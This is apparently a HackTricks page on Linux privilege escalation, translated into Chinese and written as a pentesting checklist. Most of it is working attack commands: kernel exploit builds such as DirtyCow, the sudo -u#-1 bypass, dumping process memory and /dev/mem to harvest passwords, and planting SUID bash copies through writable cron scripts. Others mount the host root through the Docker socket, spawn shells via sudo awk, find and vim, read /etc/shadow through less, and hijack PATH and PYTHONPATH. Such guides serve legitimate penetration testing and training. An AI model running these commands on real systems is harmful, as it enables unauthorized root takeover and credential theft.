# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## 系统信息

### 操作系统信息

让我们开始了解正在运行的操作系统
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### 路径

如果您**对`PATH`变量中的任何文件夹具有写入权限**，您可能能够劫持某些库或二进制文件：
```bash
echo $PATH
```
### Env info

环境变量中有有趣的信息、密码或API密钥吗？
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

检查内核版本，看看是否有可以用来提升权限的漏洞。
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
您可以在这里找到一个好的易受攻击内核列表和一些已经**编译的漏洞利用**： [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) 和 [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits)。\
其他可以找到一些**编译的漏洞利用**的网站： [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries)， [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

要从该网站提取所有易受攻击的内核版本，您可以执行：
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
可能有助于搜索内核漏洞的工具包括：

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)（在受害者上执行，仅检查2.x内核的漏洞）

始终**在Google中搜索内核版本**，也许您的内核版本在某个内核漏洞中被写入，这样您就可以确定该漏洞是有效的。

### CVE-2016-5195 (DirtyCow)

Linux权限提升 - Linux内核 <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo 版本

基于出现在的易受攻击的 sudo 版本：
```bash
searchsploit sudo
```
您可以使用此 grep 检查 sudo 版本是否存在漏洞。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

来自 @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg 签名验证失败

检查 **smasher2 box of HTB** 以获取此漏洞如何被利用的 **示例**
```bash
dmesg 2>/dev/null | grep "signature"
```
### 更多系统枚举
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 列举可能的防御措施

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

如果你在一个docker容器内，你可以尝试逃离它：

{{#ref}}
docker-security/
{{#endref}}

## Drives

检查**已挂载和未挂载的内容**，以及它们的位置和原因。如果有任何未挂载的内容，你可以尝试挂载它并检查私人信息。
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 有用的软件

列举有用的二进制文件
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
还要检查是否**安装了任何编译器**。如果您需要使用某个内核漏洞，这很有用，因为建议在您将要使用它的机器上（或类似的机器上）进行编译。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 安装的易受攻击软件

检查**已安装软件包和服务的版本**。可能存在某些旧版的Nagios（例如），可以被利用来提升权限……\
建议手动检查更可疑的已安装软件的版本。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
如果您可以访问机器的SSH，您还可以使用 **openVAS** 检查机器上安装的过时和易受攻击的软件。

> [!NOTE] > _请注意，这些命令将显示大量信息，其中大部分将是无用的，因此建议使用一些应用程序，如OpenVAS或类似工具，检查任何已安装的软件版本是否易受已知漏洞的攻击_

## Processes

查看 **正在执行的进程**，并检查是否有任何进程具有 **超出其应有的权限**（例如，是否有由root执行的tomcat？）
```bash
ps aux
ps -ef
top -n 1
```
始终检查可能正在运行的 [**electron/cef/chromium debuggers**，您可以利用它来提升权限](electron-cef-chromium-debugger-abuse.md)。**Linpeas** 通过检查进程命令行中的 `--inspect` 参数来检测这些。\
还要**检查您对进程二进制文件的权限**，也许您可以覆盖某个用户。

### 进程监控

您可以使用像 [**pspy**](https://github.com/DominicBreuker/pspy) 这样的工具来监控进程。这对于识别频繁执行的易受攻击的进程或在满足一组要求时非常有用。

### 进程内存

某些服务器服务在**内存中以明文保存凭据**。\
通常，您需要**root 权限**才能读取属于其他用户的进程的内存，因此这通常在您已经是 root 并想要发现更多凭据时更有用。\
但是，请记住，**作为普通用户，您可以读取您拥有的进程的内存**。

> [!WARNING]
> 请注意，如今大多数机器**默认不允许 ptrace**，这意味着您无法转储属于您无权限用户的其他进程。
>
> 文件 _**/proc/sys/kernel/yama/ptrace_scope**_ 控制 ptrace 的可访问性：
>
> - **kernel.yama.ptrace_scope = 0**：所有进程都可以被调试，只要它们具有相同的 uid。这是 ptracing 工作的经典方式。
> - **kernel.yama.ptrace_scope = 1**：只有父进程可以被调试。
> - **kernel.yama.ptrace_scope = 2**：只有管理员可以使用 ptrace，因为它需要 CAP_SYS_PTRACE 能力。
> - **kernel.yama.ptrace_scope = 3**：不允许使用 ptrace 跟踪任何进程。一旦设置，需要重启才能再次启用 ptracing。

#### GDB

如果您可以访问 FTP 服务的内存（例如），您可以获取堆并在其凭据中进行搜索。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB 脚本
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

对于给定的进程 ID，**maps 显示该进程的** 虚拟地址空间内如何映射内存；它还显示 **每个映射区域的权限**。**mem** 伪文件 **暴露了进程的内存本身**。通过 **maps** 文件，我们知道哪些 **内存区域是可读的** 及其偏移量。我们使用这些信息 **在 mem 文件中查找并将所有可读区域转储到文件中**。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` 提供对系统 **物理** 内存的访问，而不是虚拟内存。内核的虚拟地址空间可以通过 /dev/kmem 访问。\
通常，`/dev/mem` 仅对 **root** 和 **kmem** 组可读。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump 是 Sysinternals 工具套件中经典 ProcDump 工具的 Linux 版本。获取地址在 [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### 工具

要转储进程内存，您可以使用：

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_您可以手动移除root要求并转储由您拥有的进程
- 来自 [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) 的脚本 A.5 (需要root)

### 从进程内存中获取凭据

#### 手动示例

如果您发现身份验证进程正在运行：
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
您可以转储进程（请参阅之前的部分以找到转储进程内存的不同方法）并在内存中搜索凭据：
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

该工具 [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) 将 **从内存中窃取明文凭据** 和一些 **知名文件**。它需要 root 权限才能正常工作。

| 特性                                             | 进程名称              |
| ------------------------------------------------ | --------------------- |
| GDM 密码（Kali 桌面，Debian 桌面）               | gdm-password          |
| Gnome Keyring（Ubuntu 桌面，ArchLinux 桌面）    | gnome-keyring-daemon  |
| LightDM（Ubuntu 桌面）                           | lightdm               |
| VSFTPd（活动 FTP 连接）                          | vsftpd                |
| Apache2（活动 HTTP 基本认证会话）                | apache2               |
| OpenSSH（活动 SSH 会话 - Sudo 使用）             | sshd:                 |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

检查是否有任何计划任务存在漏洞。也许你可以利用由 root 执行的脚本（通配符漏洞？可以修改 root 使用的文件？使用符号链接？在 root 使用的目录中创建特定文件？）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

例如，在 _/etc/crontab_ 中可以找到 PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_注意用户 "user" 对 /home/user 具有写入权限_)

如果在这个 crontab 中，root 用户尝试执行某个命令或脚本而没有设置路径。例如: _\* \* \* \* root overwrite.sh_\
然后，您可以通过使用获得 root shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron 使用带通配符的脚本（通配符注入）

如果由 root 执行的脚本在命令中包含“**\***”，您可以利用这一点来制造意想不到的事情（例如提权）。示例：
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**如果通配符前面有一个路径，比如** _**/some/path/\***_ **，那么它就不容易受到攻击（即使** _**./\***_ **也不行）。**

阅读以下页面以获取更多通配符利用技巧：

{{#ref}}
wildcards-spare-tricks.md
{{#endref}}

### Cron 脚本覆盖和符号链接

如果你**可以修改一个由 root 执行的 cron 脚本**，你可以很容易地获得一个 shell：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
如果由 root 执行的脚本使用一个 **您拥有完全访问权限的目录**，那么删除该文件夹并 **创建一个指向另一个文件夹的符号链接**，该文件夹提供由您控制的脚本，可能会很有用。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Frequent cron jobs

您可以监控进程以搜索每 1、2 或 5 分钟执行的进程。也许您可以利用它来提升权限。

例如，要**每 0.1 秒监控 1 分钟**，**按执行次数较少的命令排序**并删除执行次数最多的命令，您可以这样做：
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**您还可以使用** [**pspy**](https://github.com/DominicBreuker/pspy/releases) （这将监视并列出每个启动的进程）。

### 隐形的 cron 作业

可以创建一个 cron 作业 **在注释后放置回车符**（没有换行符），并且 cron 作业将正常工作。示例（注意回车符）：
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## 服务

### 可写的 _.service_ 文件

检查您是否可以写入任何 `.service` 文件，如果可以，您 **可以修改它** 以便在服务 **启动**、**重启**或 **停止** 时 **执行** 您的 **后门**（也许您需要等到机器重启）。\
例如，在 .service 文件中创建您的后门，使用 **`ExecStart=/tmp/script.sh`**

### 可写的服务二进制文件

请记住，如果您对由服务执行的二进制文件具有 **写权限**，您可以将它们更改为后门，这样当服务重新执行时，后门将被执行。

### systemd PATH - 相对路径

您可以使用以下命令查看 **systemd** 使用的 PATH：
```bash
systemctl show-environment
```
如果您发现可以在路径的任何文件夹中**写入**，则可能能够**提升权限**。您需要搜索**在服务配置**文件中使用的**相对路径**，例如：
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
然后，在您可以写入的 systemd PATH 文件夹中创建一个 **可执行文件**，其 **名称与相对路径二进制文件相同**，当服务被要求执行脆弱操作（**启动**，**停止**，**重新加载**）时，您的 **后门将被执行**（普通用户通常无法启动/停止服务，但请检查您是否可以使用 `sudo -l`）。

**了解有关服务的更多信息，请参见 `man systemd.service`。**

## **定时器**

**定时器** 是以 `**.timer**` 结尾的 systemd 单元文件，用于控制 `**.service**` 文件或事件。 **定时器** 可以作为 cron 的替代方案，因为它们内置支持日历时间事件和单调时间事件，并且可以异步运行。

您可以使用以下命令列出所有定时器：
```bash
systemctl list-timers --all
```
### 可写定时器

如果您可以修改定时器，则可以使其执行一些 systemd.unit 的实例（例如 `.service` 或 `.target`）
```bash
Unit=backdoor.service
```
在文档中，您可以阅读到单位的定义：

> 当此计时器到期时要激活的单位。参数是单位名称，其后缀不是“.timer”。如果未指定，则此值默认为与计时器单位同名的服务，除了后缀外。（见上文。）建议激活的单位名称和计时器单位的单位名称在名称上保持一致，除了后缀。

因此，要滥用此权限，您需要：

- 找到某个 systemd 单元（如 `.service`），该单元正在 **执行一个可写的二进制文件**
- 找到某个 systemd 单元，该单元正在 **执行一个相对路径**，并且您对 **systemd PATH** 具有 **可写权限**（以伪装该可执行文件）

**了解更多关于计时器的信息，请使用 `man systemd.timer`。**

### **启用计时器**

要启用计时器，您需要 root 权限并执行：
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
注意 **timer** 是通过在 `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` 上创建一个符号链接来 **激活** 的。

## Sockets

Unix 域套接字 (UDS) 使得在客户端-服务器模型中同一台或不同机器上的 **进程通信** 成为可能。它们利用标准的 Unix 描述符文件进行计算机间通信，并通过 `.socket` 文件进行设置。

可以使用 `.socket` 文件配置套接字。

**通过 `man systemd.socket` 了解更多关于套接字的信息。** 在此文件中，可以配置几个有趣的参数：

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: 这些选项不同，但总结用于 **指示它将监听的位置**（AF_UNIX 套接字文件的路径，监听的 IPv4/6 和/或端口号等）
- `Accept`: 接受一个布尔参数。如果 **true**，则为每个传入连接 **生成一个服务实例**，并且仅将连接套接字传递给它。如果 **false**，则所有监听套接字本身 **传递给启动的服务单元**，并且仅为所有连接生成一个服务单元。对于数据报套接字和 FIFO，此值被忽略，因为单个服务单元无条件处理所有传入流量。**默认为 false**。出于性能原因，建议仅以适合 `Accept=no` 的方式编写新守护进程。
- `ExecStartPre`, `ExecStartPost`: 接受一个或多个命令行，这些命令在监听 **套接字**/FIFO 被 **创建** 和绑定之前或之后 **执行**。命令行的第一个标记必须是绝对文件名，后面跟着进程的参数。
- `ExecStopPre`, `ExecStopPost`: 在监听 **套接字**/FIFO 被 **关闭** 和移除之前或之后 **执行** 的额外 **命令**。
- `Service`: 指定 **服务** 单元名称 **以激活** 在 **传入流量** 上。此设置仅允许用于 Accept=no 的套接字。默认为与套接字同名的服务（后缀被替换）。在大多数情况下，不需要使用此选项。

### 可写的 .socket 文件

如果您发现一个 **可写** 的 `.socket` 文件，可以在 `[Socket]` 部分的开头添加类似 `ExecStartPre=/home/kali/sys/backdoor` 的内容，后门将在套接字创建之前执行。因此，您 **可能需要等到机器重启。**\
_请注意，系统必须使用该套接字文件配置，否则后门将不会被执行_

### 可写套接字

如果您 **识别到任何可写套接字**（_现在我们谈论的是 Unix 套接字，而不是配置 `.socket` 文件_），那么 **您可以与该套接字通信**，并可能利用一个漏洞。

### 枚举 Unix 套接字
```bash
netstat -a -p --unix
```
### 原始连接
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**利用示例：**

{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP 套接字

请注意，可能有一些 **监听 HTTP** 请求的 **套接字**（_我不是在谈论 .socket 文件，而是作为 unix 套接字的文件_）。您可以通过以下方式检查：
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
如果套接字 **响应一个 HTTP** 请求，那么你可以 **与之通信**，并可能 **利用某些漏洞**。

### 可写的 Docker 套接字

Docker 套接字，通常位于 `/var/run/docker.sock`，是一个关键文件，应该被保护。默认情况下，它对 `root` 用户和 `docker` 组的成员是可写的。拥有对这个套接字的写访问权限可能导致权限提升。以下是如何做到这一点的分解，以及在 Docker CLI 不可用时的替代方法。

#### **使用 Docker CLI 提升权限**

如果你对 Docker 套接字具有写访问权限，可以使用以下命令提升权限：
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
这些命令允许您以根级别访问主机的文件系统运行容器。

#### **直接使用 Docker API**

在 Docker CLI 不可用的情况下，仍然可以使用 Docker API 和 `curl` 命令操作 Docker 套接字。

1.  **列出 Docker 镜像：** 检索可用镜像的列表。

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **创建容器：** 发送请求以创建一个挂载主机系统根目录的容器。

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

启动新创建的容器：

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **附加到容器：** 使用 `socat` 建立与容器的连接，从而在其中执行命令。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

在设置 `socat` 连接后，您可以直接在容器中执行命令，具有对主机文件系统的根级别访问权限。

### 其他

请注意，如果您对 Docker 套接字具有写权限，因为您**在 `docker` 组内**，您有[**更多的权限提升方式**](interesting-groups-linux-pe/index.html#docker-group)。如果[**docker API 在某个端口上监听**，您也可能能够妥协它](../../network-services-pentesting/2375-pentesting-docker.md#compromising)。

查看**更多从 Docker 中突破或滥用它以提升权限的方法**：

{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) 权限提升

如果您发现可以使用 **`ctr`** 命令，请阅读以下页面，因为**您可能能够滥用它以提升权限**：

{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** 权限提升

如果您发现可以使用 **`runc`** 命令，请阅读以下页面，因为**您可能能够滥用它以提升权限**：

{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus 是一个复杂的 **进程间通信 (IPC) 系统**，使应用程序能够高效地交互和共享数据。它是为现代 Linux 系统设计的，提供了一个强大的框架，用于不同形式的应用程序通信。

该系统灵活多变，支持基本的 IPC，增强了进程之间的数据交换，类似于 **增强的 UNIX 域套接字**。此外，它有助于广播事件或信号，促进系统组件之间的无缝集成。例如，来自蓝牙守护进程的关于来电的信号可以提示音乐播放器静音，从而增强用户体验。此外，D-Bus 支持远程对象系统，简化了应用程序之间的服务请求和方法调用，简化了传统上复杂的过程。

D-Bus 基于 **允许/拒绝模型**，根据匹配策略规则的累积效果管理消息权限（方法调用、信号发射等）。这些策略指定与总线的交互，可能通过利用这些权限来允许权限提升。

在 `/etc/dbus-1/system.d/wpa_supplicant.conf` 中提供了一个此类策略的示例，详细说明了根用户拥有、发送和接收来自 `fi.w1.wpa_supplicant1` 的消息的权限。

没有指定用户或组的策略适用于所有情况，而“默认”上下文策略适用于所有未被其他特定策略覆盖的情况。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**学习如何枚举和利用 D-Bus 通信：**

{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **网络**

枚举网络并确定机器的位置总是很有趣。

### 通用枚举
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### 开放端口

始终检查在您无法与之交互的机器上运行的网络服务：
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

检查您是否可以嗅探流量。如果可以，您可能能够获取一些凭据。
```
timeout 1 tcpdump
```
## 用户

### 通用枚举

检查 **你是谁**，你拥有的 **权限**，系统中有哪些 **用户**，哪些可以 **登录**，哪些具有 **root 权限**：
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

一些Linux版本受到一个漏洞的影响，允许**UID > INT_MAX**的用户提升权限。更多信息：[here](https://gitlab.freedesktop.org/polkit/polkit/issues/74)，[here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) 和 [here](https://twitter.com/paragonsec/status/1071152249529884674)。\
**利用它**使用：**`systemd-run -t /bin/bash`**

### Groups

检查您是否是可以授予您root权限的**某个组的成员**：

{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

检查剪贴板中是否有任何有趣的内容（如果可能的话）
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### 密码策略
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 已知密码

如果您**知道环境中的任何密码**，请尝试使用该密码**登录每个用户**。

### Su Brute

如果您不介意制造很多噪音，并且计算机上存在`su`和`timeout`二进制文件，您可以尝试使用[su-bruteforce](https://github.com/carlospolop/su-bruteforce)进行暴力破解用户。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)使用`-a`参数也会尝试暴力破解用户。

## 可写的 PATH 滥用

### $PATH

如果您发现可以**在 $PATH 的某个文件夹内写入**，您可能能够通过**在可写文件夹内创建一个后门**，其名称为将由其他用户（理想情况下是 root）执行的某个命令，并且该命令**不是从位于您可写文件夹之前的文件夹加载的**，来提升权限。

### SUDO 和 SUID

您可能被允许使用 sudo 执行某些命令，或者它们可能具有 suid 位。使用以下命令检查：
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
一些**意外的命令允许您读取和/或写入文件，甚至执行命令。** 例如：
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo 配置可能允许用户在不知道密码的情况下以其他用户的权限执行某些命令。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
在这个例子中，用户 `demo` 可以以 `root` 身份运行 `vim`，现在通过将 ssh 密钥添加到根目录或调用 `sh` 来获取 shell 变得非常简单。
```
sudo vim -c '!sh'
```
### SETENV

此指令允许用户在执行某些操作时**设置环境变量**：
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
这个例子，**基于 HTB 机器 Admirer**，**易受** **PYTHONPATH 劫持** 的影响，可以在以 root 身份执行脚本时加载任意 python 库：
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo 执行绕过路径

**跳转** 以读取其他文件或使用 **符号链接**。例如在 sudoers 文件中： _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
如果使用 **wildcard** (\*)，则更容易：
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**对策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### 没有命令路径的 Sudo 命令/SUID 二进制文件

如果 **sudo 权限** 被授予单个命令 **而未指定路径**: _hacker10 ALL= (root) less_，你可以通过更改 PATH 变量来利用它。
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
这种技术也可以在**suid**二进制文件**执行另一个命令而不指定路径时使用（始终检查**_**strings**_**工具查看奇怪的SUID二进制文件的内容）**。

[执行的有效载荷示例。](payloads-to-execute.md)

### 带命令路径的SUID二进制文件

如果**suid**二进制文件**执行另一个命令并指定路径**，那么你可以尝试**导出一个函数**，其名称与suid文件调用的命令相同。

例如，如果一个suid二进制文件调用_**/usr/sbin/service apache2 start**_，你需要尝试创建该函数并导出它：
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
